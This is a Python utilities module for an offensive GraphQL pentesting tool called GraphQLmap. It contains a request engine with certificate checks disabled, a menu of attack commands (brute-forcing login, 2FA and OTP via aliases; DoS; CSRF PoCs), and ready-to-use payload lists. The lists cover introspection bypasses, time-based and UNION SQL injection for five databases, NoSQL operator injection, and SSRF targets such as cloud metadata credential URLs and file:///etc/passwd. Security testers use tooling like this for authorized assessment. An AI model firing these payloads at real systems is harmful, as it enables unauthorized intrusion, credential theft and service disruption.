#!/usr/bin/env python3
"""
GraphQLmap v2.0 - Utilities Module
Enhanced utility functions for GraphQL pentesting.
"""

import argparse
import json
import os
import sys
import re
import time
import ssl
import socket

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[!] 'requests' library is required. Install with: pip install requests")
    sys.exit(1)

try:
    import websocket as ws_lib
    HAS_WEBSOCKET = True
except ImportError:
    HAS_WEBSOCKET = False

# ─────────────────────────────────────────────
# Autocomplete command list
# ─────────────────────────────────────────────
cmdlist = [
    "exit", "help", "dump_via_introspection", "dump_via_fragment",
    "dump_via_get", "dump_via_urlencoded",
    "introspection_bypass", "field_suggestion",
    "alias_bruteforce", "alias_dos",
    "directive_dos",
    "csrf_poc",
    "depth_dos",
    "detect_endpoint", "fingerprint",
    "nosqli", "postgresqli", "mysqli", "mssqli", "oraclesqli", "sqlitei",
    "ssrf_test",
    "websocket_test",
    "edges_extract",
    "type_info",
    "save_schema",
    "mutation", "edges", "node",
    "$regex", "$ne", "__schema", "__typename", "__type",
    "debug",
]


def auto_completer(text, state):
    """Tab autocomplete handler."""
    options = [x for x in cmdlist if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None


def jq(data):
    """Pretty-print JSON data."""
    return json.dumps(data, indent=4, sort_keys=True)


def colorize(text, color):
    """Apply ANSI color to text."""
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "bold": "\033[1m",
        "reset": "\033[0m",
    }
    return f"{colors.get(color, '')}{text}{colors['reset']}"


# ─────────────────────────────────────────────
# HTTP Request Engine
# ─────────────────────────────────────────────
def requester(url, method, payload, proxy, headers=None, use_json=False,
              is_batch=0, content_type=None, timeout=30):
    """
    Send HTTP requests to the GraphQL endpoint.
    Supports POST (JSON, form-urlencoded), GET, and batch queries.
    """
    if headers is None:
        headers = {}

    new_headers = headers.copy()

    try:
        if method.upper() == "POST" or use_json:
            data = None

            if is_batch > 0:
                # JSON list-based batching
                data = [{"query": payload.replace("+", " ")} for _ in range(is_batch)]
                r = requests.post(
                    url, json=data, verify=False, headers=new_headers,
                    proxies=proxy, timeout=timeout
                )

            elif content_type == "urlencoded":
                # x-www-form-urlencoded (for CSRF / introspection bypass)
                new_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                form_data = f"query={payload.replace('+', ' ')}"
                r = requests.post(
                    url, data=form_data, verify=False, headers=new_headers,
                    proxies=proxy, timeout=timeout
                )

            else:
                # Standard JSON POST
                data = {"query": payload.replace("+", " ")}
                if use_json:
                    new_headers['Content-Type'] = 'application/json'
                    r = requests.post(
                        url, data=json.dumps(data), verify=False,
                        headers=new_headers, proxies=proxy, timeout=timeout
                    )
                else:
                    r = requests.post(
                        url, data=data, verify=False, headers=new_headers,
                        proxies=proxy, timeout=timeout
                    )

            if r.status_code == 500:
                print(colorize("[!] API returned 500 Internal Server Error", "red"))
                return r
            return r

        else:
            # GET request
            clean_payload = payload.replace("+", " ")
            if "?" in url:
                full_url = f"{url}&query={requests.utils.quote(clean_payload)}"
            else:
                full_url = f"{url}?query={requests.utils.quote(clean_payload)}"
            r = requests.get(
                full_url, verify=False, headers=headers,
                proxies=proxy, timeout=timeout
            )
            return r

    except requests.exceptions.Timeout:
        print(colorize("[!] Request timed out", "red"))
        return None
    except requests.exceptions.ConnectionError:
        print(colorize("[!] Connection error - target may be unreachable", "red"))
        return None
    except Exception as e:
        print(colorize(f"[!] Request error: {str(e)}", "red"))
        return None


def requester_raw(url, method, raw_body, proxy, headers=None, timeout=30):
    """Send a raw HTTP request with arbitrary body."""
    if headers is None:
        headers = {}
    try:
        if method.upper() == "POST":
            r = requests.post(
                url, data=raw_body, verify=False, headers=headers,
                proxies=proxy, timeout=timeout
            )
        else:
            r = requests.get(
                url, verify=False, headers=headers,
                proxies=proxy, timeout=timeout
            )
        return r
    except Exception as e:
        print(colorize(f"[!] Raw request error: {str(e)}", "red"))
        return None


# ─────────────────────────────────────────────
# WebSocket Support
# ─────────────────────────────────────────────
def ws_connect(url, headers=None, subprotocol="graphql-ws"):
    """Establish a WebSocket connection for GraphQL subscriptions."""
    if not HAS_WEBSOCKET:
        print(colorize("[!] websocket-client not installed. Run: pip install websocket-client", "red"))
        return None
    try:
        ws_url = url.replace("http://", "ws://").replace("https://", "wss://")
        ws = ws_lib.create_connection(
            ws_url,
            header=headers or {},
            subprotocols=[subprotocol],
            sslopt={"cert_reqs": ssl.CERT_NONE}
        )
        # Send connection_init
        ws.send(json.dumps({"type": "connection_init", "payload": {}}))
        result = ws.recv()
        print(colorize(f"[+] WebSocket connected: {result}", "green"))
        return ws
    except Exception as e:
        print(colorize(f"[!] WebSocket connection failed: {str(e)}", "red"))
        return None


# ─────────────────────────────────────────────
# Argument Parser
# ─────────────────────────────────────────────
def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="GraphQLmap v2.0 - GraphQL Pentesting Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  graphqlmap -u https://target.com/graphql
  graphqlmap -u https://target.com/graphql --method POST --json
  graphqlmap -u https://target.com/graphql --headers '{"Authorization":"Bearer TOKEN"}'
  graphqlmap -u https://target.com/graphql --proxy http://127.0.0.1:8080
  graphqlmap -u https://target.com/graphql --detect
  graphqlmap -u https://target.com/graphql --output results.json
        """
    )
    parser.add_argument('-u', action='store', dest='url',
                        help="Target GraphQL endpoint URL")
    parser.add_argument('-v', action='store_true', dest='verbosity',
                        help="Enable verbose output")
    parser.add_argument('--method', action='store', dest='method',
                        help="HTTP method (GET/POST)", default="POST")
    parser.add_argument('--headers', action='store', dest='headers',
                        help="Custom HTTP headers as JSON string", type=str)
    parser.add_argument('--json', action='store_true', dest='use_json',
                        help="Force JSON Content-Type (implies POST)")
    parser.add_argument('--proxy', action='store', dest='proxy',
                        help="HTTP proxy (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument('--output', '-o', action='store', dest='output',
                        help="Save output to file", default=None)
    parser.add_argument('--detect', action='store_true', dest='detect',
                        help="Auto-detect GraphQL endpoint")
    parser.add_argument('--wordlist', action='store', dest='wordlist',
                        help="Custom wordlist for field suggestion brute-force", default=None)
    parser.add_argument('--timeout', action='store', dest='timeout',
                        help="Request timeout in seconds", type=int, default=30)

    results = parser.parse_args()
    if results.url is None and not results.detect:
        parser.print_help()
        exit()
    return results


# ─────────────────────────────────────────────
# Help Display
# ─────────────────────────────────────────────
def display_help():
    """Display the full help menu with all available commands."""
    sections = {
        "RECONNAISSANCE": [
            ("detect_endpoint", "Auto-discover GraphQL endpoints on target"),
            ("fingerprint", "Fingerprint the GraphQL server engine"),
            ("debug", "Display available types via __schema"),
        ],
        "SCHEMA DUMPING": [
            ("dump_via_introspection", "Dump schema via IntrospectionQuery (v15+)"),
            ("dump_via_fragment", "Dump schema via fragment-based query (v14)"),
            ("dump_via_get", "Dump schema via GET request (bypass POST-only blocks)"),
            ("dump_via_urlencoded", "Dump schema via x-www-form-urlencoded POST"),
            ("introspection_bypass", "Try multiple introspection bypass techniques"),
            ("field_suggestion", "Recover schema via field suggestion brute-force"),
            ("type_info <TypeName>", "Get detailed info about a specific type"),
        ],
        "INJECTION ATTACKS": [
            ("nosqli", "Blind NoSQL injection exploitation"),
            ("postgresqli", "Blind PostgreSQL time-based injection"),
            ("mysqli", "Blind MySQL time-based injection"),
            ("mssqli", "Blind MSSQL time-based injection"),
            ("oraclesqli", "Blind Oracle time-based injection"),
            ("sqlitei", "Blind SQLite time-based injection"),
            ("ssrf_test", "Test for SSRF via GraphQL mutations"),
        ],
        "BATCHING & BRUTE FORCE": [
            ("BATCHING_N <query>", "Send N copies of query in JSON array batch"),
            ("alias_bruteforce", "Alias-based brute force (login, 2FA, OTP bypass)"),
            ("alias_dos", "Test alias overloading DoS"),
            ("directive_dos", "Test directive overloading DoS"),
        ],
        "DENIAL OF SERVICE": [
            ("depth_dos", "Generate deeply nested query for depth limit testing"),
            ("alias_dos", "Alias overloading DoS test"),
            ("directive_dos", "Directive overloading DoS test"),
        ],
        "CSRF & WEBSOCKET": [
            ("csrf_poc", "Generate CSRF proof-of-concept HTML"),
            ("websocket_test", "Test GraphQL over WebSocket subscriptions"),
        ],
        "DATA EXTRACTION": [
            ("edges_extract", "Extract data using Relay edges/nodes pattern"),
            ("{query}", "Execute any raw GraphQL query"),
            ("GRAPHQL_CHARSET", "Bruteforce characters in a query field"),
            ("GRAPHQL_INCREMENT_N", "Iterate numbers 0..N in a query field"),
        ],
        "UTILITY": [
            ("save_schema", "Save dumped schema to JSON file"),
            ("help", "Display this help menu"),
            ("exit / q", "Exit GraphQLmap"),
        ],
    }

    for section, commands in sections.items():
        print(f"\n  {colorize(f'═══ {section} ═══', 'cyan')}")
        for cmd, desc in commands:
            print(f"    {colorize(cmd, 'green'):50s} {desc}")
    print()


# ─────────────────────────────────────────────
# Common GraphQL Endpoints
# ─────────────────────────────────────────────
COMMON_ENDPOINTS = [
    "/graphql",
    "/graphiql",
    "/graphql/console",
    "/v1/graphql",
    "/v2/graphql",
    "/v1/graphiql",
    "/api/graphql",
    "/api/graphiql",
    "/graphql/api",
    "/graphql/graphql",
    "/graph",
    "/graphql.php",
    "/graphiql.php",
    "/api",
    "/api/v1/graphql",
    "/api/v2/graphql",
    "/query",
    "/gql",
    "/index.php?graphql",
    "/altair",
    "/playground",
    "/explorer",
    "/v1/explorer",
]


# ─────────────────────────────────────────────
# Introspection Payloads
# ─────────────────────────────────────────────

# Universal probe
UNIVERSAL_QUERY = "query{__typename}"

# Full introspection query (GraphQL v15+)
INTROSPECTION_QUERY_V15 = """query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}"""

# Single-line introspection (no fragments)
INTROSPECTION_ONELINER = "{__schema{queryType{name},mutationType{name},subscriptionType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}"

# Introspection bypass variants (special chars after __schema)
INTROSPECTION_BYPASS_PAYLOADS = [
    # Newline after __schema
    "{__schema\n{queryType{name}}}",
    # Space after __schema
    "{__schema {queryType{name}}}",
    # Comma after __schema
    "{__schema,{queryType{name}}}",
    # Tab after __schema
    "{__schema\t{queryType{name}}}",
    # Comment injection
    "{__schema#comment\n{queryType{name}}}",
    # Using query keyword
    "query{__schema{queryType{name}}}",
    # With operation name
    "query IntrospectionQuery{__schema{queryType{name}}}",
    # Aliased
    "{s:__schema{queryType{name}}}",
    # With __type instead
    '{__type(name:"Query"){name fields{name type{name kind}}}}',
    # Fragments approach
    "{...on Query{__schema{queryType{name}}}}",
]


# ─────────────────────────────────────────────
# Server Fingerprint Signatures
# ─────────────────────────────────────────────
FINGERPRINT_SIGNATURES = {
    "Apollo Server": [
        "PersistedQueryNotFound",
        "PersistedQueryNotSupported",
        "apollo-server",
        "GRAPHQL_VALIDATION_FAILED",
    ],
    "Hasura": [
        "not a valid graphql query",
        "x-hasura",
        "hasura",
    ],
    "Graphene (Python)": [
        "graphene",
        "Syntax Error GraphQL",
    ],
    "GraphQL Yoga": [
        "graphql-yoga",
        "Unexpected error",
    ],
    "Ariadne": [
        "ariadne",
    ],
    "Strawberry": [
        "strawberry",
    ],
    "WPGraphQL": [
        "wpgraphql",
        "wp_graphql",
        "WordPress",
    ],
    "AWS AppSync": [
        "appsync",
        "x-amzn",
        "UnauthorizedException",
    ],
    "Dgraph": [
        "dgraph",
    ],
    "HotChocolate (.NET)": [
        "hotchocolate",
        "HC0",
    ],
    "Juniper (Rust)": [
        "juniper",
    ],
    "Sangria (Scala)": [
        "sangria",
    ],
    "graphql-ruby": [
        "graphql-ruby",
    ],
    "graphql-java": [
        "graphql-java",
        "InvalidSyntax",
    ],
    "Mercurius": [
        "mercurius",
    ],
    "Absinthe (Elixir)": [
        "absinthe",
    ],
}

# ─────────────────────────────────────────────
# SQL Injection Payloads
# ─────────────────────────────────────────────
SQLI_PAYLOADS = {
    "postgresql": [
        "1 AND pg_sleep(30) --",
        "1'; SELECT pg_sleep(30);--",
        "1' AND (SELECT pg_sleep(30))--",
        "1' OR pg_sleep(30)--",
        "1'; WAITFOR DELAY '00:00:30';--",
        "1' UNION SELECT NULL,NULL,pg_sleep(30)--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
    ],
    "mysql": [
        "'-SLEEP(30); #",
        "1' AND SLEEP(30)#",
        "1' AND SLEEP(30)-- -",
        "1' OR SLEEP(30)#",
        "1' AND BENCHMARK(10000000,SHA1('test'))#",
        "1' UNION SELECT NULL#",
        "1' UNION SELECT NULL,NULL#",
        "1' UNION SELECT NULL,NULL,NULL#",
        "1' AND 1=1#",
        "1' AND 1=2#",
        "1' ORDER BY 1#",
    ],
    "mssql": [
        "'; WAITFOR DELAY '00:00:30';--",
        "1'; WAITFOR DELAY '00:00:30';--",
        "1' AND 1=(SELECT 1 FROM (SELECT SLEEP(30))A)--",
        "1'; IF (1=1) WAITFOR DELAY '00:00:30';--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ],
    "oracle": [
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',30)--",
        "1' AND UTL_INADDR.get_host_name('10.0.0.1')='10.0.0.1'--",
        "1' UNION SELECT NULL FROM DUAL--",
        "1' UNION SELECT NULL,NULL FROM DUAL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ],
    "sqlite": [
        "1' AND 1=randomblob(500000000)--",
        "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ],
}

# ─────────────────────────────────────────────
# NoSQL Injection Payloads
# ─────────────────────────────────────────────
NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$gt": ""}',
    '{"$gt": 0}',
    '{"$gte": 0}',
    '{"$lt": 99999}',
    '{"$regex": ".*"}',
    '{"$regex": "^a"}',
    '{"$exists": true}',
    '{"$in": [true, false]}',
    '{"$nin": []}',
    '{"$or": [{"a": 1}, {"b": 1}]}',
    '{"$where": "1==1"}',
    '{"$where": "this.password.match(/.*/)"}',
]

# ─────────────────────────────────────────────
# SSRF Payloads
# ─────────────────────────────────────────────
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.169.254/metadata/v1/",
    "http://127.0.0.1:22",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:6379/info",
]
